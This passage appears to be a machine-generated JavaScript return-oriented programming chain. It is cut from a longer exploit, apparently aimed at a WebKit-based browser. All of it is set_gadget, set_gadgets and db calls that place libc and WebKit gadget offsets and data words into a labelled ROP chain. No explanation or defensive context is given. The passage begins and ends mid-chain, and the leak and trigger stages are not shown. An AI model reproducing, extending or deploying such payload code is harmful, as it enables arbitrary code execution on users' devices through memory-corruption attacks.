set_gadget(libc_base+165442,);
//L6996:
db([0,0]);
set_gadget(libc_base+772328,);
//L6997:
db([16,0]);// 0x10
set_gadget(libc_base+768796,);
//L6998:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+713278,
ropchain+371384,//L7000
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L7000:
db([0,0]);
set_gadgets([
libc_base+288783,
libc_base+713278,
ropchain+371496,//L7001
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+371528,//L7003
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+371512,//L7002
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L7001:
db([0,0]);
set_gadget(libc_base+772328,);
//L7002:
db([0,0]);
set_gadget(libc_base+768796,);
//L7003:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+371688,//L7007
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+371640,//L7004
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+371656,//L7005
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L7004:
db([0,0]);
set_gadget(libc_base+165442,);
//L7005:
db([0,0]);
set_gadget(libc_base+772328,);
//L7006:
db([48,0]);
set_gadget(libc_base+768796,);
//L7007:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+857183,
libc_base+713278,
ropchain+371760,//L7009
webkit_base+4687784,
libc_base+772328
]);
//L7008:
db([48,0]);
set_gadget(libc_base+768796,);
//L7009:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+857183,
libc_base+713278,
ropchain+371928,//L7011
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+371960,//L7013
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+371912,//L7010
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+371944,//L7012
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L7010:
db([0,0]);
set_gadget(libc_base+165442,);
//L7011:
db([0,0]);
set_gadget(libc_base+772328,);
//L7012:
db([0,0]);
set_gadget(libc_base+768796,);
//L7013:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+372120,//L7017
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+372072,//L7014
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+372088,//L7015
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L7014:
db([0,0]);
set_gadget(libc_base+165442,);
//L7015:
db([0,0]);
set_gadget(libc_base+772328,);
//L7016:
db([48,0]);
set_gadget(libc_base+768796,);
//L7017:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+857183,
libc_base+713278,
ropchain+372224,//L7019
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+372208,//L7018
webkit_base+4687784,
libc_base+772328
]);
//L7018:
db([0,0]);
set_gadget(libc_base+768796,);
//L7019:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+372320,//L7022
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L7020:
db([24,0]);// 0x18
set_gadget(libc_base+772328,);
//L7022:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+372408,//L7024
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+372424,//L7025
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L7024:
db([0,0]);
set_gadget(libc_base+772328,);
//L7025:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+372528,//L7028
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+372512,//L7027
]);